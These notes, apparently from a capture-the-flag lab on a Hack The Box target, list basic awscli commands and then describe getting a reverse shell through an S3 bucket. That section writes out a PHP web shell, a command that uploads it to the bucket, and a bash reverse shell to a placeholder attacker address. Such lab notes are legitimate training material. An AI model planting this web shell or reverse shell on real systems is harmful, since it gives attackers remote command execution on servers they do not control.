#### `awscli`

Is the official command-line interface (CLI) provided by Amazon Web Services (AWS). It allows users to interact with various AWS services directly from the command line
Used to interact with AWS servers, domains, and S3 buckets.

# To execute commands on an endpoint
aws --endpoint=<hostname> <type> <command>

# List S3 Buckets
aws s3 ls

# Create an EC2 Instance
aws ec2 run-instances --image-id ami-xxxxxxxx --instance-type t2.micro --key-name MyKeyPair

# List EC2 Instances
aws ec2 describe-instances

# Configure AWS CLI
aws configure






#### Reverse Shell in AWS S3

If an AWS bucket is found, you can upload a script to execute commands on it.

# 1. Create a PHP script that executes commands
echo '<?php system($_GET["cmd"]); ?>' > shell.php


# 2. Upload the script to the bucket
aws --endpoint={url} s3 cp shell.php s3://thetoppers.htb


# 3. Create a reverse shell script and listen on your machine
Reverse shell script
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
